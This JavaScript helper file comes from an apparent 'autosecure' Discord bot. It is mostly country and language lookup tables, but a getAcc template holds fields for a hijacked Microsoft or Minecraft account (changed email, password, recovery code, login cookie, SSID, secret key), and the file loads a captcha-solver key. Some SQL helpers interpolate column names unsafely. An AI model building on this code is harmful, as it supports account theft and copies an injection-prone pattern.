const { queryParams } = require("../../../db/database");
const config = require("../../../config.json");
const axios = require("axios");
const FormData = require("form-data");
const { faker } = require('@faker-js/faker');
let countries2 = ["AF", "AX", "AL", "DZ", "AS", "AD", "AO", "AI", "AQ", "AG", "AR", "AM", "AW", "AU", "AT", "AZ", "BS", "BH", "BD", "BB", "BY", "BE", "BZ", "BJ", "BM", "BT", "BO", "BQ", "BA", "BW", "BV", "BR", "IO", "VG", "BN", "BG", "BF", "BI", "CV", "KH", "CM", "CA", "KY", "CF", "TD", "CL", "CN", "CX", "CC", "CO", "KM", "CG", "CD", "CK", "CR", "CI", "HR", "CU", "CW", "CY", "CZ", "DK", "DJ", "DM", "DO", "EC", "EG", "SV", "GQ", "ER", "EE", "SZ", "ET", "FK", "FO", "FJ", "FI", "FR", "GF", "PF", "TF", "GA", "GM", "GE", "DE", "GH", "GI", "GR", "GL", "GD", "GP", "GU", "GT", "GG", "GN", "GW", "GY", "HT", "HM", "HN", "HK", "HU", "IS", "IN", "ID", "IR", "IQ", "IE", "IM", "IL", "IT", "JM", "XJ", "JP", "JE", "JO", "KZ", "KE", "KI", "KR", "XK", "KW", "KG", "LA", "LV", "LB", "LS", "LR", "LY", "LI", "LT", "LU", "MO", "MG", "MW", "MY", "MV", "ML", "MT", "MH", "MQ", "MR", "MU", "YT", "MX", "FM", "MD", "MC", "MN", "ME", "MS", "MA", "MZ", "MM", "NA", "NR", "NP", "NL", "NC", "NZ", "NI", "NE", "NG", "NU", "NF", "KP", "MK", "MP", "NO", "OM", "PK", "PW", "PS", "PA", "PG", "PY", "PE", "PH", "PN", "PL", "PT", "PR", "QA", "RE", "RO", "RU", "RW", "XS", "BL", "KN", "LC", "MF", "PM", "VC", "WS", "SM", "ST", "SA", "SN", "RS", "SC", "SL", "SG", "XE", "SX", "SK", "SI", "SB", "SO", "ZA", "GS", "SS", "ES", "LK", "SH", "SD", "SR", "SJ", "SE", "CH", "SY", "TW", "TJ", "TZ", "TH", "TL", "TG", "TK", "TO", "TT", "TN", "TR", "TM", "TC", "TV", "UM", "VI", "UG", "UA", "AE", "UK", "US", "UY", "UZ", "VU", "VA", "VE", "VN", "WF", "YE", "ZM", "ZW"]
const API_KEY = config.captchakey;
const HttpClient = require('./HttpClient');
const { getUserBotNumbers } = require("../bot/configutils");
const { autosecureMap } = require("../../../mainbot/handlers/botHandler");



const microsoftCountries = {
  AF: { name: "Afghanistan", iso3: "AFG" },
  AX: { name: "Åland Islands", iso3: "ALA" },
  AL: { name: "Albania", iso3: "ALB" },
  DZ: { name: "Algeria", iso3: "DZA" },
  AS: { name: "American Samoa", iso3: "ASM" },
  AD: { name: "Andorra", iso3: "AND" },
  AO: { name: "Angola", iso3: "AGO" },
  AI: { name: "Anguilla", iso3: "AIA" },
  AQ: { name: "Antarctica", iso3: "ATA" },
  AG: { name: "Antigua and Barbuda", iso3: "ATG" },
  AR: { name: "Argentina", iso3: "ARG" },
  AM: { name: "Armenia", iso3: "ARM" },
  AW: { name: "Aruba", iso3: "ABW" },
  AU: { name: "Australia", iso3: "AUS" },
  AT: { name: "Austria", iso3: "AUT" },
  AZ: { name: "Azerbaijan", iso3: "AZE" },
  BS: { name: "Bahamas", iso3: "BHS" },
  BH: { name: "Bahrain", iso3: "BHR" },
  BD: { name: "Bangladesh", iso3: "BGD" },
  BB: { name: "Barbados", iso3: "BRB" },
  BY: { name: "Belarus", iso3: "BLR" },
  BE: { name: "Belgium", iso3: "BEL" },
  BZ: { name: "Belize", iso3: "BLZ" },
  BJ: { name: "Benin", iso3: "BEN" },
  BM: { name: "Bermuda", iso3: "BMU" },
  BT: { name: "Bhutan", iso3: "BTN" },
  BO: { name: "Bolivia", iso3: "BOL" },
  BQ: { name: "Bonaire", iso3: "BES" },
  BA: { name: "Bosnia and Herzegovina", iso3: "BIH" },
  BW: { name: "Botswana", iso3: "BWA" },
  BV: { name: "Bouvet Island", iso3: "BVT" },
  BR: { name: "Brazil", iso3: "BRA" },
  IO: { name: "British Indian Ocean Territory", iso3: "IOT" },
  VG: { name: "British Virgin Islands", iso3: "VGB" },
  BN: { name: "Brunei", iso3: "BRN" },
  BG: { name: "Bulgaria", iso3: "BGR" },
  BF: { name: "Burkina Faso", iso3: "BFA" },
  BI: { name: "Burundi", iso3: "BDI" },
  CV: { name: "Cabo Verde", iso3: "CPV" },
  KH: { name: "Cambodia", iso3: "KHM" },
  CM: { name: "Cameroon", iso3: "CMR" },
  CA: { name: "Canada", iso3: "CAN" },
  KY: { name: "Cayman Islands", iso3: "CYM" },
  CF: { name: "Central African Republic", iso3: "CAF" },
  TD: { name: "Chad", iso3: "TCD" },
  CL: { name: "Chile", iso3: "CHL" },
  CN: { name: "China", iso3: "CHN" },
  CX: { name: "Christmas Island", iso3: "CXR" },
  CC: { name: "Cocos (Keeling) Islands", iso3: "CCK" },
  CO: { name: "Colombia", iso3: "COL" },
  KM: { name: "Comoros", iso3: "COM" },
  CG: { name: "Congo", iso3: "COG" },
  CD: { name: "Congo (DRC)", iso3: "COD" },
  CK: { name: "Cook Islands", iso3: "COK" },
  CR: { name: "Costa Rica", iso3: "CRI" },
  CI: { name: "Côte d'Ivoire", iso3: "CIV" },
  HR: { name: "Croatia", iso3: "HRV" },
  CU: { name: "Cuba", iso3: "CUB" },
  CW: { name: "Curaçao", iso3: "CUW" },
  CY: { name: "Cyprus", iso3: "CYP" },
  CZ: { name: "Czechia", iso3: "CZE" },
  DK: { name: "Denmark", iso3: "DNK" },
  DJ: { name: "Djibouti", iso3: "DJI" },
  DM: { name: "Dominica", iso3: "DMA" },
  DO: { name: "Dominican Republic", iso3: "DOM" },
  EC: { name: "Ecuador", iso3: "ECU" },
  EG: { name: "Egypt", iso3: "EGY" },
  SV: { name: "El Salvador", iso3: "SLV" },
  GQ: { name: "Equatorial Guinea", iso3: "GNQ" },
  ER: { name: "Eritrea", iso3: "ERI" },
  EE: { name: "Estonia", iso3: "EST" },
  SZ: { name: "Eswatini", iso3: "SWZ" },
  ET: { name: "Ethiopia", iso3: "ETH" },
  FK: { name: "Falkland Islands", iso3: "FLK" },
  FO: { name: "Faroe Islands", iso3: "FRO" },
  FJ: { name: "Fiji", iso3: "FJI" },
  FI: { name: "Finland", iso3: "FIN" },
  FR: { name: "France", iso3: "FRA" },
  GF: { name: "French Guiana", iso3: "GUF" },
  PF: { name: "French Polynesia", iso3: "PYF" },
  TF: { name: "French Southern Territories", iso3: "ATF" },
  GA: { name: "Gabon", iso3: "GAB" },
  GM: { name: "Gambia", iso3: "GMB" },
  GE: { name: "Georgia", iso3: "GEO" },
  DE: { name: "Germany", iso3: "DEU" },
  GH: { name: "Ghana", iso3: "GHA" },
  GI: { name: "Gibraltar", iso3: "GIB" },
  GR: { name: "Greece", iso3: "GRC" },
  GL: { name: "Greenland", iso3: "GRL" },
  GD: { name: "Grenada", iso3: "GRD" },
  GP: { name: "Guadeloupe", iso3: "GLP" },
  GU: { name: "Guam", iso3: "GUM" },
  GT: { name: "Guatemala", iso3: "GTM" },
  GG: { name: "Guernsey", iso3: "GGY" },
  GN: { name: "Guinea", iso3: "GIN" },
  GW: { name: "Guinea-Bissau", iso3: "GNB" },
  GY: { name: "Guyana", iso3: "GUY" },
  HT: { name: "Haiti", iso3: "HTI" },
  HM: { name: "Heard Island and McDonald Islands", iso3: "HMD" },
  HN: { name: "Honduras", iso3: "HND" },
  HK: { name: "Hong Kong SAR", iso3: "HKG" },
  HU: { name: "Hungary", iso3: "HUN" },
  IS: { name: "Iceland", iso3: "ISL" },
  IN: { name: "India", iso3: "IND" },
  ID: { name: "Indonesia", iso3: "IDN" },
  IR: { name: "Iran", iso3: "IRN" },
  IQ: { name: "Iraq", iso3: "IRQ" },
  IE: { name: "Ireland", iso3: "IRL" },
  IM: { name: "Isle of Man", iso3: "IMN" },
  IL: { name: "Israel", iso3: "ISR" },
  IT: { name: "Italy", iso3: "ITA" },
  JM: { name: "Jamaica", iso3: "JAM" },
  XJ: { name: "Jan Mayen", iso3: "XJM" },
  JP: { name: "Japan", iso3: "JPN" },
  JE: { name: "Jersey", iso3: "JEY" },
  JO: { name: "Jordan", iso3: "JOR" },
  KZ: { name: "Kazakhstan", iso3: "KAZ" },
  KE: { name: "Kenya", iso3: "KEN" },
  KI: { name: "Kiribati", iso3: "KIR" },
  KR: { name: "Korea", iso3: "KOR" },
  XK: { name: "Kosovo", iso3: "XKX" },
  KW: { name: "Kuwait", iso3: "KWT" },
  KG: { name: "Kyrgyzstan", iso3: "KGZ" },
  LA: { name: "Laos", iso3: "LAO" },
  LV: { name: "Latvia", iso3: "LVA" },
  LB: { name: "Lebanon", iso3: "LBN" },
  LS: { name: "Lesotho", iso3: "LSO" },
  LR: { name: "Liberia", iso3: "LBR" },
  LY: { name: "Libya", iso3: "LBY" },
  LI: { name: "Liechtenstein", iso3: "LIE" },
  LT: { name: "Lithuania", iso3: "LTU" },
  LU: { name: "Luxembourg", iso3: "LUX" },
  MO: { name: "Macao SAR", iso3: "MAC" },
  MG: { name: "Madagascar", iso3: "MDG" },
  MW: { name: "Malawi", iso3: "MWI" },
  MY: { name: "Malaysia", iso3: "MYS" },
  MV: { name: "Maldives", iso3: "MDV" },
  ML: { name: "Mali", iso3: "MLI" },
  MT: { name: "Malta", iso3: "MLT" },
  MH: { name: "Marshall Islands", iso3: "MHL" },
  MQ: { name: "Martinique", iso3: "MTQ" },
  MR: { name: "Mauritania", iso3: "MRT" },
  MU: { name: "Mauritius", iso3: "MUS" },
  YT: { name: "Mayotte", iso3: "MYT" },
  MX: { name: "Mexico", iso3: "MEX" },
  FM: { name: "Micronesia", iso3: "FSM" },
  MD: { name: "Moldova", iso3: "MDA" },
  MC: { name: "Monaco", iso3: "MCO" },
  MN: { name: "Mongolia", iso3: "MNG" },
  ME: { name: "Montenegro", iso3: "MNE" },
  MS: { name: "Montserrat", iso3: "MSR" },
  MA: { name: "Morocco", iso3: "MAR" },
  MZ: { name: "Mozambique", iso3: "MOZ" },
  MM: { name: "Myanmar", iso3: "MMR" },
  NA: { name: "Namibia", iso3: "NAM" },
  NR: { name: "Nauru", iso3: "NRU" },
  NP: { name: "Nepal", iso3: "NPL" },
  NL: { name: "Netherlands", iso3: "NLD" },
  NC: { name: "New Caledonia", iso3: "NCL" },
  NZ: { name: "New Zealand", iso3: "NZL" },
  NI: { name: "Nicaragua", iso3: "NIC" },
  NE: { name: "Niger", iso3: "NER" },
  NG: { name: "Nigeria", iso3: "NGA" },
  NU: { name: "Niue", iso3: "NIU" },
  NF: { name: "Norfolk Island", iso3: "NFK" },
  KP: { name: "North Korea", iso3: "PRK" },
  MK: { name: "North Macedonia", iso3: "MKD" },
  MP: { name: "Northern Mariana Islands", iso3: "MNP" },
  NO: { name: "Norway", iso3: "NOR" },
  OM: { name: "Oman", iso3: "OMN" },
  PK: { name: "Pakistan", iso3: "PAK" },
  PW: { name: "Palau", iso3: "PLW" },
  PS: { name: "Palestinian Authority", iso3: "PSE" },
  PA: { name: "Panama", iso3: "PAN" },
  PG: { name: "Papua New Guinea", iso3: "PNG" },
  PY: { name: "Paraguay", iso3: "PRY" },
  PE: { name: "Peru", iso3: "PER" },
  PH: { name: "Philippines", iso3: "PHL" },
  PN: { name: "Pitcairn Islands", iso3: "PCN" },
  PL: { name: "Poland", iso3: "POL" },
  PT: { name: "Portugal", iso3: "PRT" },
  PR: { name: "Puerto Rico", iso3: "PRI" },
  QA: { name: "Qatar", iso3: "QAT" },
  RE: { name: "Réunion", iso3: "REU" },
  RO: { name: "Romania", iso3: "ROU" },
  RU: { name: "Russia", iso3: "RUS" },
  RW: { name: "Rwanda", iso3: "RWA" },
  XS: { name: "Saba", iso3: "XSA" },
  BL: { name: "Saint Barthélemy", iso3: "BLM" },
  KN: { name: "Saint Kitts and Nevis", iso3: "KNA" },
  LC: { name: "Saint Lucia", iso3: "LCA" },
  MF: { name: "Saint Martin", iso3: "MAF" },
  PM: { name: "Saint Pierre and Miquelon", iso3: "SPM" },
  VC: { name: "Saint Vincent and the Grenadines", iso3: "VCT" },
  WS: { name: "Samoa", iso3: "WSM" },
  SM: { name: "San Marino", iso3: "SMR" },
  ST: { name: "São Tomé and Príncipe", iso3: "STP" },
  SA: { name: "Saudi Arabia", iso3: "SAU" },
  SN: { name: "Senegal", iso3: "SEN" },
  RS: { name: "Serbia", iso3: "SRB" },
  SC: { name: "Seychelles", iso3: "SYC" },
  SL: { name: "Sierra Leone", iso3: "SLE" },
  SG: { name: "Singapore", iso3: "SGP" },
  XE: { name: "Sint Eustatius", iso3: "XSE" },
  SX: { name: "Sint Maarten", iso3: "SXM" },
  SK: { name: "Slovakia", iso3: "SVK" },
  SI: { name: "Slovenia", iso3: "SVN" },
  SB: { name: "Solomon Islands", iso3: "SLB" },
  SO: { name: "Somalia", iso3: "SOM" },
  ZA: { name: "South Africa", iso3: "ZAF" },
  GS: { name: "South Georgia and South Sandwich Islands", iso3: "SGS" },
  SS: { name: "South Sudan", iso3: "SSD" },
  ES: { name: "Spain", iso3: "ESP" },
  LK: { name: "Sri Lanka", iso3: "LKA" },
  SH: { name: "St Helena, Ascension, Tristan da Cunha", iso3: "SHN" },
  SD: { name: "Sudan", iso3: "SDN" },
  SR: { name: "Suriname", iso3: "SUR" },
  SJ: { name: "Svalbard", iso3: "SJM" },
  SE: { name: "Sweden", iso3: "SWE" },
  CH: { name: "Switzerland", iso3: "CHE" },
  SY: { name: "Syria", iso3: "SYR" },
  TW: { name: "Taiwan", iso3: "TWN" },
  TJ: { name: "Tajikistan", iso3: "TJK" },
  TZ: { name: "Tanzania", iso3: "TZA" },
  TH: { name: "Thailand", iso3: "THA" },
  TL: { name: "Timor-Leste", iso3: "TLS" },
  TG: { name: "Togo", iso3: "TGO" },
  TK: { name: "Tokelau", iso3: "TKL" },
  TO: { name: "Tonga", iso3: "TON" },
  TT: { name: "Trinidad and Tobago", iso3: "TTO" },
  TN: { name: "Tunisia", iso3: "TUN" },
  TR: { name: "Türkiye", iso3: "TUR" },
  TM: { name: "Turkmenistan", iso3: "TKM" },
  TC: { name: "Turks and Caicos Islands", iso3: "TCA" },
  TV: { name: "Tuvalu", iso3: "TUV" },
  UM: { name: "U.S. Outlying Islands", iso3: "UMI" },
  VI: { name: "U.S. Virgin Islands", iso3: "VIR" },
  UG: { name: "Uganda", iso3: "UGA" },
  UA: { name: "Ukraine", iso3: "UKR" },
  AE: { name: "United Arab Emirates", iso3: "ARE" },
  UK: { name: "United Kingdom", iso3: "GBR" },
  US: { name: "United States", iso3: "USA" },
  UY: { name: "Uruguay", iso3: "URY" },
  UZ: { name: "Uzbekistan", iso3: "UZB" },
  VU: { name: "Vanuatu", iso3: "VUT" },
  VA: { name: "Vatican City", iso3: "VAT" },
  VE: { name: "Venezuela", iso3: "VEN" },
  VN: { name: "Vietnam", iso3: "VNM" },
  WF: { name: "Wallis and Futuna", iso3: "WLF" },
  YE: { name: "Yemen", iso3: "YEM" },
  ZM: { name: "Zambia", iso3: "ZMB" },
  ZW: { name: "Zimbabwe", iso3: "ZWE" }
};

const countryAliases = {
  "côte d'ivoire": "CI",
  "ivory coast": "CI",
  "cote d'ivoire": "CI",
  "burma": "MM",
  "east timor": "TL",
  "timor leste": "TL",
  "palestinian territories": "PS",
  "palestine": "PS",
  "republic of the congo": "CG",
  "congo republic": "CG",
  "democratic republic of the congo": "CD",
  "drc": "CD",
  "dr congo": "CD",
  "swaziland": "SZ",
  "eswatini": "SZ",
  "macau": "MO",
  "macao": "MO",
  "vatican": "VA",
  "holy see": "VA",
  "cape verde": "CV",
  "cabo verde": "CV",
  "east timor": "TL",
  "timor-leste": "TL",
  "myanmar": "MM",
  "burma": "MM",
  "czech republic": "CZ",
  "czechia": "CZ",
  "british virgin islands": "VG",
  "virgin islands, british": "VG",
  "u.s. virgin islands": "VI",
  "virgin islands, u.s.": "VI",
  "united kingdom": "UK",
  "great britain": "UK",
  "gb": "UK",
  "gbr": "UK"
};


function getCountryCode2(input) {
  console.log(`input: ${input}`)
  if (!input || typeof input !== "string") return null;
  
  const cleanInput = input.trim().toUpperCase();
  const lowerInput = input.trim().toLowerCase();

  // 1. Check if input is already a valid ISO2 code
  if (cleanInput.length === 2 && microsoftCountries[cleanInput]) {
   console.log(`Valid ISO2: ${input}`)
    return cleanInput;
  }

  // 2. Check if input is an ISO3 code
  if (cleanInput.length === 3) {
    console.log(`Checking ISO3: ${input}`)
    for (const [iso2, data] of Object.entries(microsoftCountries)) {
      if (data.iso3 === cleanInput) {
        return iso2;
      }
    }
  }

  // 3. Check country name exact match (case insensitive)
  for (const [iso2, data] of Object.entries(microsoftCountries)) {
    if (data.name.toLowerCase() === lowerInput) {
      return iso2;
    }
  }

  // 4. Check country aliases
  if (countryAliases[lowerInput]) {
    return countryAliases[lowerInput];
  }

  // 5. Additional checks for partial matches or special cases
  // (e.g., "United States of America" vs "United States")
  const partialMatches = {
    "united states of america": "US",
    "usa": "US",
    "united states": "US",
    "korea, south": "KR",
    "south korea": "KR",
    "korea, north": "KP",
    "north korea": "KP",
    "russian federation": "RU",
    "russia": "RU",
    "iran, islamic republic of": "IR",
    "syrian arab republic": "SY",
    "venezuela, bolivarian republic of": "VE",
    "taiwan, province of china": "TW",
    "viet nam": "VN",
    "lao people's democratic republic": "LA",
    "macedonia, the former yugoslav republic of": "MK",
    "moldova, republic of": "MD",
    "tanzania, united republic of": "TZ",
    "bolivia, plurinational state of": "BO",
    "brunei darussalam": "BN",
    "congo, the democratic republic of the": "CD",
    "côte d'ivoire": "CI",
    "falkland islands (malvinas)": "FK",
    "holy see (vatican city state)": "VA",
    "hong kong": "HK",
    "macao": "MO",
    "micronesia, federated states of": "FM",
    "palestinian territory, occupied": "PS",
    "saint helena": "SH",
    "saint pierre and miquelon": "PM",
    "saint vincent and the grenadines": "VC",
    "sao tome and principe": "ST",
    "south georgia and the south sandwich islands": "GS",
    "svalbard and jan mayen": "SJ",
    "united kingdom of great britain and northern ireland": "UK",
    "united states minor outlying islands": "UM",
    "virgin islands, u.s.": "VI"
  };

  if (partialMatches[lowerInput]) {
    return partialMatches[lowerInput];
  }

  // 6. Final check - remove special characters and try again
  const simplifiedInput = lowerInput.replace(/[^a-z]/g, ' ');
  for (const [iso2, data] of Object.entries(microsoftCountries)) {
    const simpleName = data.name.toLowerCase().replace(/[^a-z]/g, ' ');
    if (simpleName.includes(simplifiedInput) || simplifiedInput.includes(simpleName)) {
      return iso2;
    }
  }

  return null;
}


const languageData = {
  "af-ZA": "Afrikaans (Suid-Afrika)",
  "az-Latn-AZ": "azərbaycan (Azərbaycan)",
  "bs-Latn-BA": "bosanski (Bosna i Hercegovina)",
  "ca-ES": "català (català)",
  "cs-CZ": "čeština (Česko)",
  "cy-GB": "Cymraeg (Y Deyrnas Unedig)",
  "da-DK": "dansk (Danmark)",
  "de-DE": "Deutsch (Deutschland)",
  "yo-NG": "Èdè Yorùbá (Nàìjíríà)",
  "et-EE": "eesti (Eesti)",
  "en-GB": "English (United Kingdom)",
  "en-US": "English (United States)",
  "es-ES": "español (España, alfabetización internacional)",
  "es-MX": "español (México)",
  "eu-ES": "euskara (euskara)",
  "fil-PH": "Filipino (Pilipinas)",
  "fr-CA": "français (Canada)",
  "fr-FR": "français (France)",
  "ga-IE": "Gaeilge (Éire)",
  "gd-GB": "Gàidhlig (An Rìoghachd Aonaichte)",
  "gl-ES": "galego (galego)",
  "ha-Latn-NG": "Hausa (Najeriya)",
  "hr-HR": "hrvatski (Hrvatska)",
  "ig-NG": "Igbo (Naịjịrịa)",
  "id-ID": "Indonesia (Indonesia)",
  "xh-ZA": "isiXhosa (eMzantsi Afrika)",
  "zu-ZA": "isiZulu (iNingizimu Afrika)",
  "is-IS": "íslenska (Ísland)",
  "it-IT": "italiano (Italia)",
  "quc-Latn-GT": "K'iche' (Guatemala)",
  "rw-RW": "Kinyarwanda (U Rwanda)",
  "sw-KE": "Kiswahili (Kenya)",
  "lv-LV": "latviešu (Latvija)",
  "lb-LU": "Lëtzebuergesch (Lëtzebuerg)",
  "lt-LT": "lietuvių (Lietuva)",
  "hu-HU": "magyar (Magyarország)",
  "mt-MT": "Malti (Malta)",
  "ms-MY": "Melayu (Malaysia)",
  "nl-NL": "Nederlands (Nederland)",
  "nb-NO": "norsk bokmål (Norge)",
  "nn-NO": "norsk nynorsk (Noreg)",
  "uz-Latn-UZ": "o'zbek (Oʻzbekiston)",
  "pl-PL": "polski (Polska)",
  "pt-BR": "português (Brasil)",
  "pt-PT": "português (Portugal)",
  "ro-RO": "română (România)",
  "quz-PE": "Runasimi (Perú)",
  "nso-ZA": "Sesotho sa Leboa (Afrika Borwa)",
  "sq-AL": "shqip (Shqipëri)",
  "sk-SK": "slovenčina (Slovensko)",
  "sl-SI": "slovenščina (Slovenija)",
  "sr-Latn-RS": "srpski (Srbija)",
  "fi-FI": "suomi (Suomi)",
  "sv-SE": "svenska (Sverige)",
  "mi-NZ": "te reo Māori (Aotearoa)",
  "vi-VN": "Tiếng Việt (Việt Nam)",
  "tr-TR": "Türkçe (Türkiye)",
  "tk-TM": "Türkmen dili (Türkmenistan)",
  "ca-ES-valencia": "valencià (Espanya)",
  "wo-SN": "Wolof (Senegaal)",
  "el-GR": "Ελληνικά (Ελλάδα)",
  "be-BY": "Беларуская (Беларусь)",
  "bg-BG": "български (България)",
  "ky-KG": "кыргызча (Кыргызстан)",
  "kk-KZ": "қазақ тілі (Қазақстан)",
  "mk-MK": "македонски (Северна Македонија)",
  "mn-MN": "монгол (Монгол)",
  "ru-RU": "русский (Россия)",
  "sr-Cyrl-BA": "српски (Босна и Херцеговина)",
  "sr-Cyrl-RS": "српски (Србија)",
  "tt-RU": "Татар (Россия)",
  "tg-Cyrl-TJ": "тоҷикӣ (Тоҷикистон)",
  "uk-UA": "українська (Україна)",
  "hy-AM": "Հայերեն (Հայաստան)",
  "ka-GE": "ქართული (საქართველო)",
  "he-IL": "עברית (ישראל)",
  "ur-PK": "اُردو (پاکستان)",
  "ar-SA": "العربية (المملكة العربية السعودية)",
  "pa-Arab-PK": "پنجابی (پاکستان)",
  "prs-AF": "درى (افغانستان)",
  "sd-Arab-PK": "سنڌي (پاکستان)",
  "fa-IR": "فارسی (ایران)",
  "ku-Arab-IQ": "کوردیی ناوەڕاست (عێراق)",
  "ug-CN": "ئۇيغۇرچە (جۇڭخۇا خەلق جۇمھۇرىيىتى)",
  "kok-IN": "कोंकणी (भारत)",
  "ne-NP": "नेपाली (नेपाल)",
  "mr-IN": "मराठी (भारत)",
  "hi-IN": "हिन्दी (भारत)",
  "as-IN": "অসমীয়া (ভাৰত)",
  "bn-BD": "বাংলা (বাংলাদেশ)",
  "bn-IN": "বাংলা (ভারত)",
  "pa-IN": "ਪੰਜਾਬੀ (ਭਾਰਤ)",
  "gu-IN": "ગુજરાતી (ભારત)",
  "or-IN": "ଓଡ଼ିଆ (ଭାରତ)",
  "ta-IN": "தமிழ் (இந்தியா)",
  "te-IN": "తెలుగు (భారతదేశం)",
  "kn-IN": "ಕನ್ನಡ (ಭಾರತ)",
  "ml-IN": "മലയാളം (ഇന്ത്യ)",
  "si-LK": "සිංහල (ශ්‍රී ලංකාව)",
  "th-TH": "ไทย (ไทย)",
  "lo-LA": "ລາວ (ລາວ)",
  "km-KH": "ខ្មែរ (កម្ពុជា)",
  "chr-Cher-US": "ᏣᎳᎩ (ᏌᏊ ᎢᏳᎾᎵᏍᏔᏅ ᏍᎦᏚᎩ)",
  "ti-ET": "ትግር (ኢትዮጵያ)",
  "am-ET": "አማርኛ (ኢትዮጵያ)",
  "ko-KR": "한국어(대한민국)",
  "zh-CN": "中文(中国)",
  "zh-TW": "中文(台灣)",
  "zh-HK": "中文(香港特別行政區)",
  "ja-JP": "日本語 (日本)"
};

const languageAliases = {
  // English
  "english": "en-US",
  "american english": "en-US",
  "british english": "en-GB",
  "eng": "en-US",
  "english us": "en-US",
  "english uk": "en-GB",
  "english united states": "en-US",
  "english united kingdom": "en-GB",

  // Spanish
  "spanish": "es-ES",
  "español": "es-ES",
  "castilian": "es-ES",
  "mexican spanish": "es-MX",
  "spain spanish": "es-ES",
  "esp": "es-ES",

  // Chinese
  "chinese": "zh-CN",
  "mandarin": "zh-CN",
  "simplified chinese": "zh-CN",
  "traditional chinese": "zh-TW",
  "chinese simplified": "zh-CN",
  "chinese traditional": "zh-TW",
  "chinese china": "zh-CN",
  "chinese taiwan": "zh-TW",
  "chinese hong kong": "zh-HK",

  // Japanese
  "japanese": "ja-JP",
  "jpn": "ja-JP",
  "nihongo": "ja-JP",

  // French
  "french": "fr-FR",
  "français": "fr-FR",
  "canadian french": "fr-CA",
  "france french": "fr-FR",
  "fra": "fr-FR",

  // German
  "german": "de-DE",
  "deutsch": "de-DE",
  "ger": "de-DE",

  // Add more aliases as needed for other languages
  "afrikaans": "af-ZA",
  "arabic": "ar-SA",
  "russian": "ru-RU",
  "portuguese": "pt-PT",
  "brazilian portuguese": "pt-BR",
  "hindi": "hi-IN",
  "korean": "ko-KR",
  "italian": "it-IT",
  "dutch": "nl-NL",
  "swedish": "sv-SE",
  "finnish": "fi-FI",
  "danish": "da-DK",
  "norwegian": "nb-NO",
  "polish": "pl-PL",
  "turkish": "tr-TR",
  "vietnamese": "vi-VN",
  "thai": "th-TH",
  "greek": "el-GR",
  "hebrew": "he-IL",
  "indonesian": "id-ID",
  "filipino": "fil-PH",
  "malay": "ms-MY",
  "urdu": "ur-PK",
  "persian": "fa-IR",
  "bengali": "bn-BD",
  "tamil": "ta-IN",
  "telugu": "te-IN",
  "kannada": "kn-IN",
  "malayalam": "ml-IN",
  "punjabi": "pa-IN",
  "gujarati": "gu-IN",
  "marathi": "mr-IN",
  "sinhala": "si-LK",
  "khmer": "km-KH",
  "lao": "lo-LA",
  "mongolian": "mn-MN",
  "ukrainian": "uk-UA",
  "belarusian": "be-BY",
  "bulgarian": "bg-BG",
  "serbian": "sr-Latn-RS",
  "croatian": "hr-HR",
  "slovenian": "sl-SI",
  "slovak": "sk-SK",
  "czech": "cs-CZ",
  "hungarian": "hu-HU",
  "romanian": "ro-RO",
  "lithuanian": "lt-LT",
  "latvian": "lv-LV",
  "estonian": "et-EE",
  "icelandic": "is-IS",
  "irish": "ga-IE",
  "scottish gaelic": "gd-GB",
  "welsh": "cy-GB",
  "basque": "eu-ES",
  "catalan": "ca-ES",
  "galician": "gl-ES",
  "valencian": "ca-ES-valencia",
  "swahili": "sw-KE",
  "yoruba": "yo-NG",
  "hausa": "ha-Latn-NG",
  "igbo": "ig-NG",
  "zulu": "zu-ZA",
  "xhosa": "xh-ZA",
  "amharic": "am-ET",
  "tigrinya": "ti-ET",
  "cherokee": "chr-Cher-US",
  "inuktitut": "iu-Cans-CA",
  "sanskrit": "sa-IN",
  "nepali": "ne-NP"
};

function getLanguageCode(input) {
  if (!input || typeof input !== "string") return null;

  const cleanInput = input.trim().toLowerCase();

  // 1. Check if input is already a valid language code
  const directMatch = Object.keys(languageData).find(
    code => code.toLowerCase() === cleanInput
  );
  if (directMatch) return directMatch;

  // 2. Check language aliases
  if (languageAliases[cleanInput]) {
    return languageAliases[cleanInput];
  }

  // 3. Check language names (case-insensitive)
  const nameMatch = Object.entries(languageData).find(
    ([_, name]) => name.toLowerCase().includes(cleanInput)
  );
  if (nameMatch) return nameMatch[0];

  // 4. Check partial matches in language names
  const partialMatch = Object.entries(languageData).find(
    ([_, name]) => cleanInput.includes(name.toLowerCase().split(" ")[0])
  );
  if (partialMatch) return partialMatch[0];

  return null;
}





const indianMap = new Map()

/*
All sorts of helpers - Autosecure & Mainbot
*/

/*
\/\*[\s\S]*?\*\/|([^\\:]|^)\/\/.*|^\s*\/\/.*
Regex to remove comments like // console log since i'm lazy
*/



// I'm autistic
function codeblock(text) {
    return '```' + '\n' + text + '\n' + '```';
}

function getBotIdFromToken(token) {
    return Buffer.from(token.split('.')[0], 'base64').toString();
}


async function getAcc() {
  return {
    oldName: "Couldn't find!",
    newName: "Couldn't change!",
    oldEmail: "Couldn't find",
    email: "Couldn't change!",
    secEmail: "Couldn't change!",
    password: "Couldn't change!",
    recoveryCode: "Couldn't change!",
    loginCookie: "Couldn't find!",
    status: "unknown",
    ban: "",
    banReason: "",
    timeTaken: 0,
    ssid: "Couldn't Get!",
    capes: [],
    gamertag: "Couldn't find!",
    secretkey: "Couldn't find!",
    mc: "False",
    gtg: "",
    xbl: "",
    xuid: "",
    uid: "",
    recoverydata: {
      email: null,
      recovery: null,
      secemail: null,
      password: null,
    },
    stats: {},
    lunar: {},
    aftersecure: false
  };
}


async function checkofflinebots(userid) {
  let botnumbers = await getUserBotNumbers(userid);
  let notStarted = [];

  for (const botnumber of botnumbers) {
    let check = await queryParams(`SELECT * FROM autosecure WHERE user_id=? AND botnumber=?`, [userid, botnumber]);
    check = check[0];

    // If there is no token, skip this bot (it's normal, not "not started")
    if (!check?.token) continue;

    let key = `${userid}|${botnumber}`;
    let hasentry = autosecureMap.get(key);

    if (!hasentry) {
      notStarted.push(botnumber);
    }
  }

  return notStarted;
}


async function updateStatus(uid, field, value) {
  await queryParams(`UPDATE status SET ${field} = ? WHERE uid = ?`, [value, uid]);
}


async function updateExtraInformation(uid, field, value) {
  try {
    await queryParams(`UPDATE extrainformation SET ${field} = ? WHERE uid = ?`, [value, uid]);
  } catch (error){
    console.log(error)
  }

}


async function timeTracker() {
  const startTime = Date.now();
  return {
    end: (sectionName) => {
      const endTime = Date.now();
      const duration = (endTime - startTime) / 1000;
      const log = `⏱️ Section "${sectionName}" completed in ${duration.toFixed(2)} seconds`;
      console.log(log);
      return duration;
    }
  };
}



function logDuration(funcName, startTime) {
  const duration = (Date.now() - startTime) / 1000;
